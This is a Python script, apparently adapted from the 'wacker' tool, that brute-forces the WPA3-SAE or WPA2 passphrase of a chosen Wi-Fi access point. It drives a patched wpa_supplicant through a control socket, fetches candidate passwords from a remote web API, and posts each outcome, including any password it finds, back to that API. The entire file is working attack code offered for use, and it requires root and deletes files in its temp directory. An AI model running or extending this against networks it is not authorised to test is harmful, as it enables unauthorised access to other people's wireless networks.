#!/usr/bin/env python3

import argparse
import logging
import os
import re
import signal
import socket
import stat
import subprocess
import sys
import time
import requests
import json

assert sys.version_info >= (3,7)

def kill(sig, frame):
    try:
        wacker.kill()
        print(f'Stopped at password attempt: {word}')
    except:
        pass
    sys.exit(0)

signal.signal(signal.SIGINT, kill)

class Wacker(object):
    RETRY = 0
    SUCCESS = 1
    FAILURE = 2
    EXIT = 3

    def __init__(self, args):
        self.args = args
        self.dir  = f'/tmp/wacker'
        self.server = f'{self.dir}/{args.interface}'
        self.conf = f'{self.server}.conf'
        self.log  = f'{self.server}.log'
        self.wpa  = './wpa_supplicant-2.8/wpa_supplicant/wpa_supplicant'
        self.pid  = f'{self.server}.pid'
        self.me = f'{self.dir}/{args.interface}_client'
        self.key_mgmt = ('SAE', 'WPA-PSK')[args.brute_wpa2]
        self.cmd = f'{self.wpa} -P {self.pid} -B -i {self.args.interface} -c {self.conf}'
        if args.debug:
            self.cmd += f' -d -t -K -f {self.log}'
        self.cmd = self.cmd.split()
        wpa_conf = 'ctrl_interface={}\n\nnetwork={{\n}}'.format(self.dir)
        #self.total_count = int(subprocess.check_output(f'wc -l {args.wordlist.name}', shell=True).split()[0].decode('utf-8'))

        # Create supplicant dir and conf (first be destructive)
        os.system(f'mkdir {self.dir} 2> /dev/null')
        os.system(f'rm -f {self.dir}/{args.interface}*')
        with open(self.conf, 'w') as f:
            f.write(wpa_conf)

        loglvl = logging.DEBUG if args.debug else logging.INFO
        logging.basicConfig(level=loglvl, filename=f'{self.server}_wacker.log', filemode='w', format='%(message)s')

        # Initial supplicant setup
        self.start_supplicant()
        self.create_uds_endpoints()
        self.one_time_setup()

        # Create rolling average for pwd/sec
        self.rolling = [0] * 150
        self.start_time = time.time()
        self.lapse = self.start_time
        print('Start time: {}'.format(time.strftime('%d %b %Y %H:%M:%S', time.localtime(self.start_time))))

    def create_uds_endpoints(self):
        ''' Create unix domain socket endpoints '''
        try:
            os.unlink(self.me)
        except Exception:
            if os.path.exists(self.me):
                raise

        # bring the interface up... won't connect otherwise
        os.system(f'ifconfig {self.args.interface} up')

        self.sock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self.sock.bind(self.me)

        logging.info(f'Connecting to {self.server}')
        try:
            self.sock.connect(self.server)
        except Exception:
            raise

    def start_supplicant(self):
        ''' Spawn a wpa_supplicant instance '''
        print(f'Starting wpa_supplicant...')
        proc = subprocess.Popen(self.cmd)
        time.sleep(2)
        logging.info(f'Started wpa_supplicant')

        # Double check it's running
        mode = os.stat(self.server).st_mode
        if not stat.S_ISSOCK(mode):
            raise Exception(f'Missing {self.server}...Is wpa_supplicant running?')

    def send_to_server(self, msg):
        ''' Send a message to the supplicant '''
        logging.debug(f'sending {msg}')
        self.sock.sendall(msg.encode())
        d = self.sock.recv(1024).decode().rstrip('\n')
        if d == "FAIL":
            raise Exception(f'{msg} failed!')
        return d

    def one_time_setup(self):
        ''' One time setup needed for supplicant '''
        self.send_to_server('ATTACH')
        self.send_to_server(f'SET_NETWORK 0 ssid "{self.args.ssid}"')
        self.send_to_server(f'SET_NETWORK 0 key_mgmt {self.key_mgmt}')
        self.send_to_server(f'SET_NETWORK 0 bssid {self.args.bssid}')
        self.send_to_server(f'SET_NETWORK 0 scan_freq {self.args.freq}')
        self.send_to_server(f'SET_NETWORK 0 freq_list {self.args.freq}')
        self.send_to_server(f'SET_NETWORK 0 ieee80211w 1')
        self.send_to_server(f'DISABLE_NETWORK 0')
        logging.debug(f'--- created network block 0 ---\n')

    def send_connection_attempt(self, psk):
        ''' Send a connection request to supplicant'''
        logging.info(f'Trying key: {psk}')
        if self.key_mgmt == 'SAE':
            self.send_to_server(f'SET_NETWORK 0 sae_password "{psk}"')
        else:
            self.send_to_server(f'SET_NETWORK 0 psk "{psk}"')
        self.send_to_server(f'ENABLE_NETWORK 0')

    def listen(self, count):
        ''' Listen for responses from supplicant '''
        while True:
            datagram = self.sock.recv(2048)
            if not datagram:
                logging.error('WTF!!!! datagram is null?!?!?! Exiting.')
                return Wacker.RETRY

            data = datagram.decode().rstrip('\n')
            event = data.split()[0]
            logging.debug(data)
            if event == "<3>CTRL-EVENT-BRUTE-FAILURE":
                self.print_stats(count)
                self.send_to_server(f'DISABLE_NETWORK 0')
                logging.info('BRUTE ATTEMPT FAIL\n')
                return Wacker.FAILURE
            elif event == "<3>CTRL-EVENT-NETWORK-NOT-FOUND":
                self.send_to_server(f'DISABLE_NETWORK 0')
                logging.info('NETWORK NOT FOUND\n')
                return Wacker.EXIT
            elif event == "<3>CTRL-EVENT-SCAN-FAILED":
                self.send_to_server(f'DISABLE_NETWORK 0')
                logging.info('SCAN FAILURE')
                return Wacker.EXIT
            elif event == "<3>CTRL-EVENT-BRUTE-SUCCESS":
                self.print_stats(count)
                logging.info('BRUTE ATTEMPT SUCCESS\n')
                return Wacker.SUCCESS
            elif event == "<3>CTRL-EVENT-BRUTE-RETRY":
                logging.info('BRUTE ATTEMPT RETRY\n')
                self.send_to_server(f'DISABLE_NETWORK 0')
                return Wacker.RETRY

    def print_stats(self, count):
        ''' Print some useful stats '''
        current = time.time()
        avg = 1 / (current - self.lapse)
        self.lapse = current
        # create rolling average
        if count <= 150:
            self.rolling[count-1] = avg
            avg = sum(self.rolling[:count]) / count
        else:
            self.rolling[(count-1) % 150] = avg
            avg = sum(self.rolling) / 150
        #spot = self.word + count
        #est = (self.total_count - spot) / avg
        #percent = spot / self.total_count * 100
        #end = time.strftime('%d %b %Y %H:%M:%S', time.localtime(current + est))
        #lapse = current - self.start_time
        #print(f'{spot:8} / {self.total_count:<8} words ({percent:2.2f}%) : {avg:4.0f} words/sec : ' \
        #      f'{lapse/3600:5.3f} hours lapsed : {est/3600:8.2f} hours to exhaust ({end})', end='\r')
        print(f'{word}')

    def kill(self):
        ''' Kill the supplicant '''
        print('\nStop time: {}'.format(time.strftime('%d %b %Y %H:%M:%S', time.localtime(time.time()))))
        os.kill(int(open(self.pid).read()), signal.SIGKILL)


def check_bssid(mac):
    if not re.match(r'^([0-9a-fA-F]{2}(?::[0-9a-fA-F]{2}){5})$', mac):
        raise argparse.ArgumentTypeError(f'{mac} is not a valid bssid')
    return mac


def check_interface(interface):
    if not os.path.isdir(f'/sys/class/net/{interface}/wireless/'):
        raise argparse.ArgumentTypeError(f'{interface} is not a wireless adapter')
    return interface


def get_word_from_api(api_url, ssid):
    try:
        params = {'ssid': ssid}
        response = requests.get(api_url, params=params)
        response.raise_for_status()
        data = response.json()
        return data.get('word')
    except requests.RequestException as e:
        logging.error(f"Error fetching word from API: {e}")
        return None
    except json.JSONDecodeError as e:
        logging.error(f"Error decoding json from API: {e}")
        return None

def report_result_to_api(api_url, ssid, word, result):
    payload = {'ssid': ssid, 'word': word, 'result': result}
    try:
        response = requests.post(api_url, json=payload)
        response.raise_for_status()
    except requests.RequestException as e:
        logging.error(f"Error reporting result to API: {e}")


parser = argparse.ArgumentParser(description='A WPA3 dictionary cracker. Must run as root!')
parser.add_argument('--interface', type=check_interface, dest='interface', required=True, help='interface to use')
parser.add_argument('--bssid', type=check_bssid, dest='bssid', required=True, help='bssid of the target')
parser.add_argument('--ssid', type=str, dest='ssid', required=True, help='the ssid of the WPA3 AP')
parser.add_argument('--freq', type=int, dest='freq', required=True, help='frequency of the ap')
parser.add_argument('--debug', action='store_true', help='increase logging output')
parser.add_argument('--wpa2', dest='brute_wpa2', action='store_true', help='brute force wpa2-personal')
parser.add_argument('--web', type=str, required=True, dest='api_url', help='web api url to fetch words')

args = parser.parse_args()

if os.geteuid() != 0:
    print('This script must be run as root!')
    sys.exit(0)

wacker = Wacker(args)

def attempt(word, count):
    while True:
        wacker.send_connection_attempt(word)
        result = wacker.listen(count)
        #if result == Wacker.EXIT:
        if result == Wacker.FAILURE:
            return result
        elif result == Wacker.SUCCESS:
            result = "success"
            return result

# Start the cracking
count = 1
while True:
    word = get_word_from_api(args.api_url, args.ssid)
    if not word:
        print("No more words available or an error occured")
        break

    word = word.rstrip('\n')
    # SAE allows all lengths otherwise WPA2 has restrictions
    if not args.brute_wpa2 or 8 <= len(word.encode('utf-8')) <= 63:
        result = attempt(word, count)
        report_result_to_api(args.api_url, args.ssid, word, result)

        if result == Wacker.SUCCESS:
            print(f"\nFound the password: '{word}'")
            break
        elif result == Wacker.EXIT:
            print(f"\nExiting due to an exit condition")
            break
    else:
        print(f'Bad word received from API: "{word}"')
        result = Wacker.FAILURE
        report_result_to_api(args.api_url, args.ssid, word, result)
    count += 1

else:
    print('\nFlag not found')

wacker.kill()
